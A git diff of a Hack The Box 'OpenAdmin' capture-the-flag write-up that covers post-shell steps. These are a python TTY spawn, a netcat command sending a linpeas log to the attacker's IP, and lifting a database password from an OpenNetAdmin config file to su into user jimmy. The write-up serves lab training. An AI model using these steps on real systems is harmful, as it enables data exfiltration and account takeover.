@@ -253,7 +253,7 @@ Now checking back on our Netcat listener, we have a shell :
 
 >www-data@openadmin  
 
-## Privilege Escalation  
+## Enumerating Internals 
 
 So, the first issue we have is we need to spawn a tty shell, because upon logging in we see the message :  
 
@@ -264,9 +264,7 @@ We can do that easily using python3 :
 ```bash
 echo "import pty; pty.spawn('/bin/bash')" > /tmp/qwerty.py
 python3 /tmp/qwerty.py
-```  
-
-### Enumerating Internals  
+```   
 
 I started grabbing important files and in /etc/passwd we see there are a couple interesting users available :  
 
@@ -300,4 +298,72 @@ nc -l -p 8899 > linpeas.log
 OpenAdmin Box:
 nc -w 3 10.10.14.42 8899 < /tmp/linpeas.log
 ```
+
+There are multiple suggestings for priv-esc. but we will come back to that, since www-data does not have enough capability to execute them.  
+
+Oftentimes, if I can get a shell, I think about what the purpose of that user is, as that is where they are likely to have the most permissions.  
+
+If you navigate to www-data's home directory, we end up in /var/www/ which is full of service config files. After going through nearly all of them, I find some important data :  
+
+```bash
+cd ~
+www-data@openadmin:/var/www/ona/local/config$ cd ~
+cd ~
+www-data@openadmin:/var/www$ cd ona/local/config
+cd ona/local/config
+www-data@openadmin:/var/www/ona/local/config$ ls -la
+ls -la
+
+total 16
+drwxrwxr-x 2 www-data www-data 4096 Nov 21  2019 .
+drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 ..
+-rw-r--r-- 1 www-data www-data  426 Nov 21  2019 database_settings.inc.php
+-rw-rw-r-- 1 www-data www-data 1201 Jan  3  2018 motd.txt.example
+-rw-r--r-- 1 www-data www-data    0 Nov 21  2019 run_installer
+```  
+
+```
+www-data@openadmin:/var/www/ona/local/config$ cat database_settings.inc.php
+
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' => 
+  array (
+    'databases' => 
+    array (
+      0 => 
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+```  
+
+I logged into the mysql DB locally but couldn't find any further useful information :  
+
+>mysql -u ona_sys -p -h localhost  
+>n1nj4W4rri0R!  
+
+## User Login - jimmy  
+
+After scouring the local database, I decided to try the password to switch user (*su*) :  
+
+```bash 
+?>www-data@openadmin:/var/www/ona/local/config$ su jimmy
+su jimmy
+Password: n1nj4W4rri0R!
+
+jimmy@openadmin:/opt/ona/www/local/config$ id
+id
+uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
+```  
 
